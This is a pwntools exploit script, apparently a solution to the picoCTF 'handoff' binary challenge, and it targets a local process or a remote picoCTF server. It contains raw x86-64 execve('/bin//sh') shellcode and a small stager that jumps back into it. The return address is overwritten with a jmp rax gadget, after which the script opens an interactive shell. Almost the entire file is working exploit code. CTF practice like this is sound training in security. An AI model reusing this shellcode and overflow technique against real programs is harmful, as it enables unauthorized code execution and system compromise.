from pwn import *

gs = '''
b *vuln+485
continue
'''

elf = context.binary = ELF("./handoff")

def start():
    if args.REMOTE:
        return remote("shape-facility.picoctf.net", 53879)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.recv()
io.sendline(b"1")

io.recv()
io.sendline(b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05")
#io.sendline(b"B"*24)
"""
io.recv()
io.sendline(b"B"*8)

io.recv()
io.sendline(b"2")

io.recv()
io.sendline(b"-4")

io.recv()
io.sendline(b"C"*8)
"""
io.recv()
io.sendline(b"3")
input("PAUSE")
shellcode = """
    nop
    nop
    nop
    sub rax, 0x2d4
    jmp rax

"""

pop_rdi = 0x00000000004014b3
jmp_rax = 0x000000000040116c
print("Len: ", len(asm(shellcode)))

payload = b"".join([
    asm(shellcode).ljust(20, b"\x90"),
    #b"\x90"*20,
    p64(jmp_rax)
])

io.recv()
io.sendline(payload)

io.interactive()